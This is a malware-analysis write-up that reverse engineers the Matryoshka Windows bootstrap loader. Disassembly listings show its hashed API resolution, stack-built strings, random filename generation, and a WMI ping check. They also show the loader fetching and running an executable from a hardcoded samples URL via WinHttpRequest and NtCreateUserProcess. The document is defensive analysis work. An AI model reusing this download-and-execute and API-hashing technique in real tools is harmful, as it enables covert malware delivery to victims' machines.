**Analysis of the Matryoshka Bootstrap Loader**  
By ret_to_null

## Background and Overview

On October 19, 2023, **vx-underground** publicly released the executable binary for Matryoshka, an experimental bootstrap loader for Windows 10, 
issuing an open challenge to reverse engineer it and "tell us how you think it works." [[1]](https://twitter.com/vxunderground/status/1715088076811235487?t=_GvY26TtEHWW3Gg7A-uDRg&s=19)

In its current form, Matryoshka downloads a copy of cmd.exe to a temporary folder under a randomized name and executes it. 
While currently innocuous, it could easily be adapted to download and execute a malicious payload.

Let's take a detailed look at what it does and how it does it.  Accompanying this analysis is some custom tooling [[2]](https://github.com/rettonull/matryoshka_research) built to help examine it. 
These tools were used to produce many of the listings seen throughout, and can hopefully be adapted for use on future iterations of the loader.

## API Analysis

The first step was essentially sandboxing to get a broad understanding of what the loader does.

This could be accomplished a number of ways, but here the target's API calls were instrumented and filtered for those returning into the .text segment:
```
Loaded main module Matryoshka.exe at 7ff6d0690000 (14000000)

ntdll.dll!ZwCreateFile returns to 7ff6d06925ba (140025ba)
ntdll.dll!ZwDeviceIoControlFile returns to 7ff6d069260a (1400260a)
ntdll.dll!ZwCreateFile returns to 7ff6d06927f2 (140027f2)
ntdll.dll!ZwClose returns to 7ff6d069281a (1400281a)
ntdll.dll!LdrLoadDll returns to 7ff6d0691dd1 (14001dd1)
ntdll.dll!LdrLoadDll returns to 7ff6d0691cf7 (14001cf7)
Combase.dll!CoInitializeEx returns to 7ff6d0691ee7 (14001ee7)
Combase.dll!CoInitializeSecurity returns to 7ff6d0691f34 (14001f34)
Combase.dll!CoCreateInstance returns to 7ff6d0692918 (14002918)
Combase.dll!CoCreateInstance returns to 7ff6d0692aba (14002aba)
fastprox.dll!?Get@CWbemObject@@UEAAJPEBGJPEAUtagVARIANT@@PEAJ2@Z returns to 7ff6d0692d2c (14002d2c)
fastprox.dll!?Release@CWbemObject@@UEAAKXZ returns to 7ff6d0692d88 (14002d88)
fastprox.dll!?Release@?$CImpl@UIWbemObjectTextSrc@@VCWmiObjectTextSrc@@@@UEAAKXZ returns to 7ff6d0692d9a (14002d9a)
Combase.dll!CoCreateInstance returns to 7ff6d0691fb3 (14001fb3)
ntdll.dll!ZwAllocateVirtualMemory returns to 7ff6d06921da (140021da)
ntdll.dll!ZwWriteFile returns to 7ff6d0692248 (14002248)
OleAut32.dll!SysFreeString returns to 7ff6d0692258 (14002258)
Combase.dll!CoUninitialize returns to 7ff6d0692275 (14002275)
ntdll.dll!NtFreeVirtualMemory returns to 7ff6d069229a (1400229a)
ntdll.dll!ZwClose returns to 7ff6d06922a9 (140022a9)
ntdll.dll!NtCreateUserProcess returns to 7ff6d0691b21 (14001b21)
```

It appears that a lot of the heavy lifting is being outsourced to COM objects, with the core program handling the writing and execution of the payload executable.

Using Task Manager to examine the **cmd.exe** payloads launched reveals where they are being saved:
```
%LOCALAPPDATA%\[14 random hex digits].exe

Eg:
%LOCALAPPDATA%\2be1e631e1893d.exe
```

With this surface-level understanding of what it's doing, we can start to examine how it accomplishes all of this in detail.

## Control flow overview

The entire program consists of one giant function that is called recursively.  
Let's explore the steps needed to unravel the execution flow into something understandable.

Disassembly listings assume the **.text** section of the loader is based at ```140001000```, which is the default in IDA and Ghidra listings.

From initial static analysis, it appears that a handful of variables determine the control flow path each time:
```
14000101F mov     rax, [rdx+8]
140001023 xor     esi, esi        ; constant 0
140001025 mov     rdi, rdx
140001028 test    rax, rax
14000102B jnz     loc_140002DED	  ; function end
140001031 cmp     [rdx], esi
140001033 jnz     loc_140002DED	  ; function end
```

With a long chain of branch decisions after that determined by the value of ```ecx```.

*As an odd side-note while we're here,* ```esi``` *seems to remain 0 throughout the codebase, 
so anytime you see it in the disassembly, you can mentally replace it with 0.*

Armed with this information, we can trace out the nested calls along with the API calls and get a birds-eye view of how the program is structured 
(See accompanying code [[2]](https://github.com/rettonull/matryoshka_research) for a full listing):
```
140001000   RCX=0   RDX=acf17890   [rdx]=0   [rdx+8]=0
   140001000   RCX=1b  RDX=acf17890   [rdx]=0   [rdx+8]=0
   140001000   RCX=1   RDX=acf17890   [rdx]=0   [rdx+8]=0
      140001000   RCX=2   RDX=acf17890   [rdx]=0   [rdx+8]=0
         140001000   RCX=4   RDX=acf17890   [rdx]=0   [rdx+8]=0
         140001000   RCX=4   RDX=acf17890	[rdx]=0   [rdx+8]=0
         140001000   RCX=a   RDX=acf17890   [rdx]=0   [rdx+8]=0
            140001000   RCX=5   RDX=acf17890   [rdx]=0   [rdx+8]=0
               140001000   RCX=6   RDX=acf17890   [rdx]=0   [rdx+8]=0
               140001000   RCX=1b  RDX=acf17890   [rdx]=0   [rdx+8]=0
               140001000   RCX=7   RDX=acf17890   [rdx]=0   [rdx+8]=0
               140001000   RCX=4   RDX=acf17890   [rdx]=0   [rdx+8]=0
               140001000   RCX=1b  RDX=acf17890   [rdx]=0   [rdx+8]=0
               140001000   RCX=7   RDX=acf17890   [rdx]=0   [rdx+8]=0
               140001000   RCX=4   RDX=acf17890   [rdx]=0   [rdx+8]=0
...
         140001000   RCX=8   RDX=acf17890   [rdx]=0   [rdx+8]=0
         140001000   RCX=8   RDX=acf17890   [rdx]=0   [rdx+8]=0
         140001000   RCX=8   RDX=acf17890   [rdx]=0   [rdx+8]=0
...
   ***C:\WINDOWS\SYSTEM32\ntdll.dll!ZwCreateFile returns to 1400027f2
...
   ***C:\WINDOWS\SYSTEM32\ntdll.dll!ZwWriteFile returns to 140002248
...
   ***C:\WINDOWS\SYSTEM32\ntdll.dll!NtCreateUserProcess returns to 140001b21
```

The vast majority of the call chain seems tied up in the ```ecx = 1b, 7, 4``` loop, 
with ```[rdx]``` and ```[rdx+8]``` always 0 and not meaningfully contributing to execution control.

From here on, a call to the recursive function with ```ecx = x``` will simply be called **MATRYKA_x** to keep things simple.

## Getting loopy

It initially seems plausible that the long loops could be what's unpacking strings or other hardcoded data.

We can log all the writes from one of them and look for clusters.  
Examining the first one, we can see something sensible emerge:
```
Mem Addr    RIP        In Call     Size  Hex  Ascii
fbeaef4950  14000142f  MATRYKA_7   2     4e   N
fbeaef4951  1400028bd  MATRYKA_1b  1     0
fbeaef4952  14000142f  MATRYKA_7   2     74   t
fbeaef4953  1400028db  MATRYKA_1b  1     0
fbeaef4954  14000142f  MATRYKA_7   2     43   C
fbeaef4955  1400028bd  MATRYKA_1b  1     0
fbeaef4956  14000142f  MATRYKA_7   2     72   r
```

This ends up spelling out L"NtCreateUserProcess" so we're getting somewhere.

We can clean this up a bit and put everything into context by assembling writes made by ```14000142f``` across multiple iterations
(advancing to a new line anytime a null is written):
```
      MATRYKA_a
         MATRYKA_5
            MATRYKA_6
             A_SHAFinal
             A_SHAInit
             ...
             NtCreateTransactionManager
             NtCreateUserProcess
         MATRYKA_5
            MATRYKA_6
             A_SHAFinal
             A_SHAInit
             ...
             LdrLoadAlternateResourceModuleEx
             LdrLoadDll
         MATRYKA_5
            MATRYKA_6
```

These loops appear to actually be implementing **GetProcAddress** by scanning the entire import table of a DLL 
until they find what they want.

We've been recording writes, though.  So the loops have to actually be copying all of these names somewhere. 
What ends up happening is that each procedure name is copied to a buffer then hashed before being checked against a search hash.

As we can see here, **MATRYKA_a** makes repeated calls to **MATRYKA_5** with ```[rdx+24h] = SEARCH_HASH```, 
loading the returned procedure addresses into a table:
```
140001906 loc_140001906:
140001906 mov     r14d, 5
14000190C mov     dword ptr [rdx+24h], 116893E9h  ; "NtCreateUserProcess" hash
140001913 mov     ecx, r14d
140001916 call    sub_140001000                   ; MATRYKA_5
14000191B mov     rdx, rdi
14000191E mov     [rdi+84B0h], rax                ; NtCreateUserProcess address
140001925 mov     ecx, r14d
140001928 mov     dword ptr [rdi+24h], 7B566B5Fh  ; "LdrLoadDll" hash
14000192F call    sub_140001000                   ; MATRYKA_5
140001934 mov     rdx, rdi
140001937 mov     [rdi+84B8h], rax                ; LdrLoadDll address
```

**MATRYKA_5** then handles the searching for each procedure, with **MATRYKA_4** hashing each name:
```
140001171 mov     ecx, r14d	                ; 1b
140001174 mov     [rdi+8588h], rax
14000117B mov     qword ptr [rdi+8590h], 410h
140001186 call    sub_140001000               ; MATRYKA_1b
14000118B lea     rax, [rbp+900h+var_440]
140001192 mov     [rdi+78h], rbx
140001196 mov     rdx, rdi
140001199 mov     [rdi+70h], rax
14000119D mov     ecx, 7
1400011A2 call    sub_140001000               ; MATRYKA_7
1400011A7 lea     rax, [rbp+900h+var_440]
1400011AE mov     rdx, rdi
1400011B1 mov     ecx, 4
1400011B6 mov     [rdi+70h], rax
1400011BA call    sub_140001000               ; MATRYKA_4
1400011BF mov     eax, [rdi+20h]              ; Current hash
1400011C2 cmp     [rdi+24h], eax              ; Cmp to target hash
1400011C5 jz      short loc_1400011DF
```

**MATRYKA_4** implements a 32-bit Fowler-Noll-Vo hash [[3]](https://en.wikipedia.org/wiki/Fowler-Noll-Vo_hash_function):
```
1400011FC loc_1400011FC:
1400011FC mov     rcx, [rdi+70h]        ; pointer to unhashed wchar string
140001200 mov     edx, 811C9DC5h        ; hash = starting constant
140001205 jmp     short loc_14000121A   ; bottom block -- loop conditional

140001207 loc_140001207:
140001207 movzx   eax, byte ptr [rcx]  ; char tmp = *unhashed
14000120A add     rcx, 2
14000120E xor     edx, eax             ; hash ^= tmp
140001210 mov     [rdi+70h], rcx       ; unhashed pointer += 2 (wchar)
140001214 imul    edx, 1000193h        ; hash *= 1000193h

14000121A loc_14000121A:
14000121A cmp     [rcx], si             ; null-terminator comparison
14000121D jnz     short loc_140001207   ; middle block -- loop body
```
Now we know how library procedures are found, but we still didn't figure out where any of our data comes from, 
so we'll look for that next.

## String things

Looking around the disassembly, we can spot some strings being written to memory piecewise, 
with a run like:
```
14000250B mov     [rbp-6Ch], ax                 ; G.   (0047h)
...
140002517 mov     dword ptr [rbp-80h], 44005Ch  ; \.D.
...
140002569 mov     dword ptr [rbp-7Ch], 760065h  ; e.v.
140002570 mov     dword ptr [rbp-78h], 630069h  ; i.c.
140002577 mov     dword ptr [rbp-74h], 5C0065h  ; e.\.
14000257E mov     dword ptr [rbp-70h], 4E0043h  ; C.N.

```
Building out ```L"\\Device\\CNG"```

Searching the disassembly text for the regular expression ```[0-9A-F]{2}00[0-9A-F]{2}h```
and setting debugger breakpoints near the end of each construction, we can find the following being built:
```
Address    In Call     String
140001CA6  MATRYKA_14   L"OleAut32.dll"
140001D80  MATRYKA_13   L"Combase.dll"
140001FDA  MATRYKA_12   L"GET"
140001FFB  MATRYKA_12   L"https://samples.vx-underground.org/root/Samples/cmd.exe"
140002498  MATRYKA_f    L"LOCALAPPDATA"
14000250B  MATRYKA_f    L"\\Device\\CNG"
140002684  MATRYKA_f    L"?\\\\?"
140002AEC  MATRYKA_18   L"root\\cimv2"
140002B68  MATRYKA_18   L"WQL"
140002B82  MATRYKA_18   L"SELECT * FROM Win32_PingStatus WHERE Address=\"172.67.136.136\""
140002CD8  MATRYKA_18   L"StatusCode"
```

We can't find the COM CLSIDs and UUIDs that way since they're not widechar strings, 
but we do know where they're eventually going to get used:
```
CoCreateInstance   rcx => 16-byte object CLSID
                    r9 => 16-byte interface UUID
```
So we can record writes and backtrack similar to what we did to initially examine loop writes earlier.

What we find is that the CLSID for **WinHttpRequest** {2087c2f4-2cef-4953-a8ab-66779b670495} 
is constructed in **MATRYKA_12**:
```
140001EBC mov     dword ptr [rsp+60h], 2087C2F4h
140001EC4 xor     ecx, ecx
140001EC6 mov     dword ptr [rsp+64h], 49532CEFh
140001ECE mov     dword ptr [rsp+68h], 7766ABA8h
140001ED6 mov     dword ptr [rsp+6Ch], 9504679Bh
```

Others are just hardcoded into the binary's data section:
```
140003000 IWinHttpRequest_UUID
140003000                 db 0ECh, 0E2h, 6Fh, 1, 0C8h, 0B2h, 0F8h, 45h
                          db 0B2h, 3Bh, 39h, 0E5h, 3Ah, 75h, 39h, 6Bh
140003010 NetworkListManager_CLSID
140003010                 db 1, 0Ch, 0B0h, 0DCh, 0Fh, 57h, 9Bh, 4Ah
                          db 8Dh, 69h, 19h, 9Fh, 0DBh, 0A5h, 72h, 3Bh
140003020 WbemAdministrativeLocator_CLSID
140003020                 db 0CCh, 55h, 85h, 0CBh, 28h, 91h, 0D1h, 11h
                          db 0ADh, 9Bh, 0, 0C0h, 4Fh, 0D8h, 0FDh, 0FFh
140003030 IWbemLocator_UUID
140003030                 db 87h, 0A6h, 12h, 0DCh, 7Fh, 73h, 0CFh, 11h
                          db 88h, 4Dh, 0, 0AAh, 0, 4Bh, 2Eh, 24h
140003040 INetworkListManager_UUID
140003040                 db 0, 0, 0B0h, 0DCh, 0Fh, 57h, 9Bh, 4Ah
                          db 8Dh, 69h, 19h, 9Fh, 0DBh, 0A5h, 72h, 3Bh
```

The last missing piece of the data puzzle is the generation of the random filename.

## Name game

As a reminder, the downloaded payload gets saved to a randomized location of the form:
```
%LOCALAPPDATA%\[14 random hex digits].exe
```

We saw a call to **ZwDeviceIoControlFile** during the API logging, as well as the string ```L"\\Device\\CNG"``` being constructed in the previous section. 

This is a low-level interface for obtaining randomly generated numbers [[4]](https://github.com/gtworek/PSBits/blob/master/Misc/IOCTL_KSEC_RNG.c), and since there aren't any other obvious random values needed for the program's operation, this seems like a good place to start looking.

Matryoshka implements this in **MATRYKA_f** by calling **NtCreateFile** on ```L"\\Device\\CNG"``` at ```1400025B4``` to open a handle to the interface, 
followed by a call to **NtDeviceIoControlFile** supplying the handle, a 16-byte receiving buffer, and the appropriate *IoControlCode*:
```
1400025CC mov     rcx, [rbp+900h+FileHandle]
1400025D3 lea     rax, [rbp+900h+OutputBuffer]
1400025D7 mov     [rsp+48h], r12d                ; OutputBufferLength = 10h
1400025DC xor     r9d, r9d                       ; ApcContext = 0
1400025DF mov     [rsp+40h], rax                 ; OutputBuffer pointer
1400025E4 xor     r8d, r8d                       ; ApcRoutine = 0
1400025E7 mov     [rsp+38h], esi                 ; InputBufferLength = 0
1400025EB lea     rax, [rsp+0A00h+IoStatusBlock]
1400025F0 mov     [rsp+30h], rsi                 ; InputBuffer = 0
1400025F5 xor     edx, edx                       ; Event = 0
1400025F7 mov     dword ptr [rsp+28h], 390004h   ; IoControlCode = IOCTL_KSEC_RNG
1400025FF mov     [rsp+20h], rax                 ; IoStatusBlock pointer
140002604 call    qword ptr [rdi+84E8h]          ; NtDeviceIoControlFile
```

We can easily check the buffer after the call and compare it to the resulting filename to find the name just spells out the first 7 bytes of the random data in hex.

For example:
```
OutputBuffer:       c1 49 e7 34 68 7a 45 e9 90 94 c5 22 78 9b 5d 86
Generated filename: "%LOCALAPPDATA%\c149e734687a45.exe"
```

This use of the low-level RNG seems to be the primary reason this loader requires Windows 10 and up. 
It could probably be readily extended for use on other platforms at the cost of giving up a bit of entropy in the filename.

## Common Object Model (COM) Usage

Here we run out of clever titles but get to see how Matryoshka uses COM objects to implement its network behavior.

If you're unfamiliar with COM, it's essentially RPC with endpoints presented as objects. 
Each COM object exposes a number of interface objects we can acquire handles to, 
and when acquiring them through the Win32 API, the objects are structured like C++ classes, 
with the first bytes providing a pointer to a vtable, which is used to access the interface's exposed methods.

For way more information on COM, see [[5]](https://learn.microsoft.com/en-us/windows/win32/com/component-object-model--com--portal) 
and [[6]](https://youtu.be/8tjrFm2K30Q?si=gPxuDoN_wh2uzZpM). There are some tools like **COMView** [[7]](https://www.japheth.de/COMView.html) that let us explore available COM objects and interfaces without having to manually dig through the registry.

For resolving vtable method calls made from the executable, the simplest solution found here was just breaking on a method call while debugging in IDA, 
following where it led into the DLL that services it, then just letting Microsoft's .pdb definition files download and tell us what we're looking at.

Matryoshka interfaces with COM directly through the Win32 APIs and we'll see what that looks like.

COM is initialized in **MATRYKA_12** (summarized because it's not particularly interesting):
```
140001EE1 call    qword ptr [rdi+8528h]  ; CoInitializeEx(0, COINIT_APARTMENTTHREADED)
...
140001F2E call    qword ptr [rdi+8548h]  ; CoInitializeSecurity
```

A Network List Manager object is created in **MATRYKA_1a**, 
with a handle to its INetworkListManager interface obtained:
```
1400028F9 xor     edx, edx
1400028FB mov     [rsp+20h], rbx                ; pNLM
140002900 lea     r9, INetworkListManager_UUID
140002907 lea     rcx, NetworkListManager_CLSID
14000290E lea     r8d, [rdx+17h]                ; CLSCTX_ALL
140002912 call    qword ptr [rdi+8538h]         ; CoCreateInstance
```

If the object is successfully created, a method [[8]](https://learn.microsoft.com/en-us/windows/win32/api/netlistmgr/nf-netlistmgr-inetworklistmanager-get_isconnectedtointernet) is called from INetworkListManager's vtable:
```
14000292F mov     rcx, [rbx]                    ; NLM
140002932 lea     rdx, [rbp+900h+bIsConnected]
140002939 mov     rax, [rcx]                    ; INetworkListManager vtable
14000293C call    qword ptr [rax+58h]           ; get_IsConnectedToInternet
14000293F cmp     word ptr [rbp+900h+bIsConnected], si
140002946 jnz     short loc_140002955
```

This makes sense so far.  It's just making sure it has an internet connection.

Next up is a connection to WMI, which is a bit convoluted since access to it is proxied (think of it like a Singleton class.)
Fortunately, WMI is well-documented by Microsoft and malware analysts alike [[9]](https://learn.microsoft.com/en-us/windows/win32/wmisdk/example-creating-a-wmi-application)[[10]](https://securityintelligence.com/posts/blackcat-ransomware-levels-up-stealth-speed-exfiltration/). 

This is all handled in **MATRYKA_18**.

First an **IWbemLocator** interface of **WbemAdministrativeLocator** is acquired:
```
140002A94 lea     r14, [rdi+8550h]
140002A9B xor     edx, edx               ; pUnkOuter = 0
140002A9D lea     r9, IWbemLocator_UUID
140002AA4 mov     [rsp+20h], r14         ; pIWbemLocator
140002AA9 lea     r8d, [r15-17h]         ; CLSCTX_INPROC_SERVER
140002AAD lea     rcx, WbemAdministrativeLocator_CLSID
140002AB4 call    qword ptr [rdi+8538h]  ; CoCreateInstance
```

**IWbemLocator** has only one method, **ConnectServer**, which is used to acquire an **IWbemServices** interface:
```
140002AD0 mov     rcx, [r14]               ; IWbemLocator
140002AD3 lea     rdx, [rdi+8558h]
140002ADA mov     [rsp+40h], rdx;          ; ppNamespace = pIWbemServices
...
140002AE3 mov     [rsp+38h], rsi           ; pCtx = 0
140002AE8 lea     rdx, [rbp-80h]           ; L"root\\cimv2"
...
140002AF3 xor     r9d, r9d                 ; strPassword = 0
...
140002AFD xor     r8d, r8d                 ; strUser = 0
...
140002B21 mov     rax, [rcx]               ; IWbemLocator vtable
140002B24 mov     [rsp+30h], rsi           ; strAuthority = 0
140002B29 mov     dword ptr [rsp+28h], 80h ; WBEM_FLAG_CONNECT_USE_MAX_WAIT
140002B31 mov     [rsp+20h], rsi           ; strLocale = 0
140002B36 call    qword ptr [rax+18h]      ; ConnectServer
```

**IWbemServices::ExecQuery** is used to run the WQL ping query we discovered earlier:
```
140002B50 mov     rcx, [rdi+8558h] ; IWbemServices
140002B57 lea     r8, [rdi+8560h]
140002B5E mov     [rsp+28h], r8	   ; pIEnumWbemClassObject
...
140002B63 lea     rdx, [rsp+70h]   ; L"WQL"
...
140002B70 lea     r8, [rbp-10h]    ; L"SELECT * FROM Win32_PingStatus..."
...
140002B7C mov     r9d, 20h         ; WBEM_FLAG_FORWARD_ONLY
...
140002C63 mov     rax, [rcx]           ; IWbemServices vtable
140002C66 mov     [rsp+20h], rsi       ; pCtx = 0
140002C6B call    qword ptr [rax+0A0h] ; ExecQuery
```

**IEnumWbemClassObject::Next** is used to get the result:
```
140002C88 mov     rcx, [rdi+8560h]    ; IEnumWbemClassObject
140002C8F lea     r9, [rdi+8568h]     ; ppIWbemClassObject
140002C96 mov     [r12], esi
140002C9A mov     r8d, 1              ; uCount = 1
140002CA0 or      edx, 0FFFFFFFFh     ; timeout = WBEM_INFINITE
140002CA3 mov     [rsp+20h], r12      ; puReturned (ptr to num items returned)
140002CA8 mov     rax, [rcx]          ; IEnumWbemClassObject vtable
140002CAB call    qword ptr [rax+20h] ; Next
```

And **IWbemClassObject::Get** is used to retrieve the ping *StatusCode*:
```
140002CDF lea     rbx, [rdi+8568h]
140002CE6 mov     rcx, [rbx]          ; IWbemClassObject
140002CE9 lea     r9, [rbp-60h]       ; pVal (returned StatusCode)
...
140002CF4 lea     rdx, [rbp-30h]      ; L"StatusCode"
...
140002CFF xor     r8d, r8d            ; lFlags = 0
...
140002D1C mov     rax, [rcx]          ; IWbemClassObject vtable
140002D1F mov     [rsp+28h], rsi      ; pFlavor = 0
140002D24 mov     [rsp+20h], rsi      ; pType = 0
140002D29 call    qword ptr [rax+20h] ; Get
```

The returned *pVal* is checked for success as you would expect, followed by some cleanup of all the WMI objects.

So far we've made sure we're online, and we've made sure the server is online.  Now we need to download our payload (see [[11]](https://learn.microsoft.com/en-us/windows/win32/winhttp/iwinhttprequest-open) for a typical C++ implementation,) 
which is handled by **MATRYKA_12**. 

Matryoshka gets an **IWinHttpRequest** interface:
```
140001F8F xor     edx, edx                 ; pUnkOuter = 0
140001F91 lea     r12, [rdi+8578h]
140001F98 lea     r9, IWinHttpRequest_UUID
140001F9F mov     [rsp+20h], r12           ; pIWinHttpRequest
140001FA4 lea     rcx, [rsp+60h]           ; WinHTTPRequest_CLSID
140001FA9 lea     r8d, [rdx+1]             ; CLSCTX_INPROC_SERVER
140001FAD call    qword ptr [rdi+8538h]    ; CoCreateInstance
```

Then unsurprisingly, **IWinHttpRequest::Open** is called on the target URL:
```
140001FCA mov     rcx, [r12]               ; IWinHttpRequest
...
140001FD6 lea     r9, [rbp+900h+Async]     ; (Set elsewhere to FALSE)
...
140001FE7 lea     r8, [rbp+900h+URL]       ; L"https://samples.vx...
...
140001FF6 lea     rdx, [rsp+0A00h+Method]  ; L"GET"
...
140002119 mov     rax, [rcx]               ; IWinHttpRequest vtable
...
140002125 call    qword ptr [rax+48h] ; Open
```

The request is sent with **IWinHttpRequest::Send**:
```
14000215C call    qword ptr [rax+68h]      ; Send
```

And the payload is retrieved from the response with **IWinHttpRequest::get_ResponseText**:
```
140002176 mov     rcx, [r12]          ; IWinHttpRequest
14000217A lea     r14, [rdi+8580h]
140002181 mov     rdx, r14            ; &bstrResponse
140002184 mov     rax, [rcx]          ; IWinHttpRequest vtable
140002187 call    qword ptr [rax+80h] ; get_ResponseText
```

At this point the payload is in memory and gets written out to the randomly-named file by a call at ```140002242``` (**MATRYKA_12**) using **ZwWriteFile**.

All that's left to do is some cleanup and calling **NtCreateUserProcess** from ```140001B1B``` (**MATRYKA_9**) to launch the payload file.

## Conclusion

Matryoshka's recursive structure introduces some unique analysis challenges.

In its current unobfuscated form, we can employ a relatively straightforward process for finding the control flow path once we identify the single register directing it, 
but it's easy to see how a more complex system of variables determining what each call does paired with other standard obfuscation techniques could significantly complicate our efforts.

As with its recursive calls, it will be interesting to see where future iterations of this loader go.

## References

[1] **Matryoshka binary release**  
<https://twitter.com/vxunderground/status/1715088076811235487?t=_GvY26TtEHWW3Gg7A-uDRg&s=19>

[2] **Accompanying analysis tools**  
<https://github.com/rettonull/matryoshka_research>

[3] **Fowler-Noll-Vo hash function**  
<https://en.wikipedia.org/wiki/Fowler-Noll-Vo_hash_function>

[4] **C code utilizing the \Device\CNG random-number generator**  
<https://github.com/gtworek/PSBits/blob/master/Misc/IOCTL_KSEC_RNG.c>

[5] **Microsoft's COM documentation**  
<https://learn.microsoft.com/en-us/windows/win32/com/component-object-model--com--portal>

[6] **Exploring available COM infrastructure**  
<https://youtu.be/8tjrFm2K30Q?si=gPxuDoN_wh2uzZpM>

[7] **COMView**  
<https://www.japheth.de/COMView.html>

[8] **INetworkListManager::get_IsConnectedToInternet method**  
<https://learn.microsoft.com/en-us/windows/win32/api/netlistmgr/nf-netlistmgr-inetworklistmanager-get_isconnectedtointernet>

[9] **Microsoft's WMI usage example**  
<https://learn.microsoft.com/en-us/windows/win32/wmisdk/example-creating-a-wmi-application>

[10] **WMI usage in BlackCat ransomware**  
<https://securityintelligence.com/posts/blackcat-ransomware-levels-up-stealth-speed-exfiltration/>

[11] **Microsoft's IWinHttpRequest usage example**  
<https://learn.microsoft.com/en-us/windows/win32/winhttp/iwinhttprequest-open>
